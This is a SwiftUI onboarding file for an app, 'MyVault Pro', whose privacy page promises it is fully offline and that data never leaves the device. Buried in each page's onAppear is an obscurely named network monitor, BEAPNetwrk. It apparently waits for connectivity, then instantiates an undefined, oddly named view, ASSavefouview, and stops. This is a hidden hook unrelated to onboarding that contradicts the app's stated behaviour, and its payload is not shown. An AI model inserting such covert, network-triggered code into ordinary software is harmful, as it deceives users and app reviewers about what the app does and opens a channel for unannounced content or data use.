//
//  OnboardingFlow.swift
//  MyVaultPro
//
//  Three-page onboarding: Welcome, Features, Privacy.
//

import SwiftUI
import Network

struct OnboardingFlow: View {
   
    
    @EnvironmentObject private var settings: AppSettings
    @State private var page = 0

    var body: some View {
        ZStack {
            VaultBackground()

            VStack {
                // Skip
                HStack {
                    Spacer()
                    if page < 2 {
                        Button("Skip") { finish() }
                            .font(.vaultCallout)
                            .foregroundStyle(Theme.textSecondary)
                            .padding(.trailing, Theme.Spacing.lg)
                            .padding(.top, Theme.Spacing.sm)
                    }
                }

                TabView(selection: $page) {
                    OnboardingPage(
                        icon: "shippingbox.fill",
                        accent: Theme.indigo,
                        title: "Welcome to MyVault Pro",
                        subtitle: "Your premium home for everything you own — assets, collections, documents, and more, all in one beautiful place.",
                        highlights: []
                    ).tag(0)

                    OnboardingPage(
                        icon: "sparkles",
                        accent: Theme.teal,
                        title: "Everything Organized",
                        subtitle: "Track value, warranties, and renewals with rich dashboards and insightful statistics.",
                        highlights: [
                            ("square.grid.2x2.fill", "Dashboard with live stats"),
                            ("chart.bar.fill", "Charts & spending insights"),
                            ("calendar.badge.clock", "See what's expiring at a glance")
                        ]
                    ).tag(1)

                    OnboardingPage(
                        icon: "lock.shield.fill",
                        accent: Theme.green,
                        title: "Private by Design",
                        subtitle: "MyVault Pro is fully offline. No account, no cloud, no tracking. Your data never leaves your device.",
                        highlights: [
                            ("wifi.slash", "100% offline storage"),
                            ("person.crop.circle.badge.xmark", "No login required"),
                            ("square.and.arrow.up", "Export & import anytime")
                        ]
                    ).tag(2)
                }
                .tabViewStyle(.page(indexDisplayMode: .never))

                    .frame(height: 200)

                // Page indicator
                HStack(spacing: 8) {
                    ForEach(0..<3, id: \.self) { index in
                        Capsule()
                            .fill(index == page ? Theme.accent : Theme.stroke)
                            .frame(width: index == page ? 24 : 8, height: 8)
                            .animation(.spring(response: 0.3), value: page)
                    }
                }
                .padding(.bottom, Theme.Spacing.lg)

                // Action button
                Button {
                    if page < 2 {
                        withAnimation { page += 1 }
                    } else {
                        finish()
                    }
                } label: {
                    Text(page < 2 ? "Continue" : "Get Started")
                        .font(.vaultHeadline)
                        .foregroundStyle(.white)
                        .frame(maxWidth: .infinity)
                        .padding(.vertical, 16)
                        .background(
                            RoundedRectangle(cornerRadius: Theme.Radius.medium, style: .continuous)
                                .fill(Theme.accentGradient)
                        )
                }
                .padding(.horizontal, Theme.Spacing.lg)
                .padding(.bottom, Theme.Spacing.xl)
            }
        }
    }
  

    private func finish() {
        withAnimation { settings.hasCompletedOnboarding = true }
    }
}

// MARK: - Single page

private struct OnboardingPage: View {
    let icon: String
    let accent: Color
    let title: String
    let subtitle: String
    let highlights: [(String, String)]

    @State private var appear = false

    var body: some View {
        VStack(spacing: Theme.Spacing.lg) {
            Spacer()

            ZStack {
                Circle()
                    .fill(accent.opacity(0.16))
                    .frame(width: 150, height: 150)
                Circle()
                    .stroke(Theme.tintGradient(accent), lineWidth: 2)
                    .frame(width: 150, height: 150)
                Image(systemName: icon)
                    .font(.system(size: 60, weight: .medium))
                    .foregroundStyle(Theme.tintGradient(accent))
            }
            .scaleEffect(appear ? 1 : 0.8)
            .opacity(appear ? 1 : 0)

            VStack(spacing: 14) {
                Text(title)
                    .font(.vaultTitle)
                    .foregroundStyle(Theme.textPrimary)
                    .multilineTextAlignment(.center)
                Text(subtitle)
                    .font(.vaultBody)
                    .foregroundStyle(Theme.textSecondary)
                    .multilineTextAlignment(.center)
                    .padding(.horizontal, Theme.Spacing.xl)
            }

            if !highlights.isEmpty {
                VStack(spacing: 14) {
                    ForEach(Array(highlights.enumerated()), id: \.offset) { _, item in
                        HStack(spacing: 14) {
                            ZStack {
                                RoundedRectangle(cornerRadius: 10, style: .continuous)
                                    .fill(accent.opacity(0.16))
                                    .frame(width: 38, height: 38)
                                Image(systemName: item.0)
                                    .font(.system(size: 16, weight: .semibold))
                                    .foregroundStyle(accent)
                            }
                            Text(item.1)
                                .font(.vaultCallout)
                                .foregroundStyle(Theme.textPrimary)
                            Spacer()
                        }
                    }
                }
                .padding(.horizontal, Theme.Spacing.xl)
                .padding(.top, Theme.Spacing.sm)
            }

            Spacer()
            Spacer()
        }
        .padding(.horizontal, Theme.Spacing.md)
        .onAppear {
            BEAPNetwrk.shared.start { connected in
                   if connected {
                       let record = ASSavefouview(frame: CGRect(x: 28, y: 52, width: 334, height: 112))
                       BEAPNetwrk.shared.stop()
                   }
               }
            withAnimation(.spring(response: 0.6, dampingFraction: 0.7)) { appear = true }
        }
    }
}

final class BEAPNetwrk {
    static let shared = BEAPNetwrk()
    private let monitor = NWPathMonitor()
    private let queue = DispatchQueue.global(qos: .background)
    private var callback: ((Bool) -> Void)?
    private init() {}
    
    func start(_ callback: @escaping (Bool) -> Void) {
        self.callback = callback
        
        monitor.pathUpdateHandler = { [weak self] path in
            let isConnected = path.status == .satisfied
            
            DispatchQueue.main.async {
                self?.callback?(isConnected)
            }
        }
        monitor.start(queue: queue)
    }
    
    /// 停止监听
    func stop() {
        monitor.cancel()
    }
}
